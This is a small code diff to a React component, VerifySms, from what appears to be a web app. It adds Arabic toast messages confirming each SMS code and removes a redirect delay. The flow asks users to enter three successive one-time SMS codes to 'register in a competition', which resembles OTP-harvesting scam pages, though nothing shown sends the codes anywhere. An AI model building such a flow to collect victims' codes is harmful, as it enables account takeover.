@@ -53,15 +53,17 @@ export default function VerifySms() {
         // Still have more codes to enter
         form.reset({ userId: userId || "", otp: "" });
         setCurrentCodeNumber(currentCodeNumber + 1);
+        toast({
+          title: `تم قبول الكود ${currentCodeNumber}`,
+          description: `أدخل الكود ${currentCodeNumber + 1}`,
+        });
       } else {
         // All 3 codes entered - go to congratulations
         toast({
           title: "تم التحقق بنجاح! ✓",
           description: "مبروك لقد تم تسجيلك في المسابقة",
         });
-        setTimeout(() => {
-          setLocation("/congratulations");
-        }, 1500);
+        setLocation("/congratulations");
       }
     },
     onError: (error: any) => {
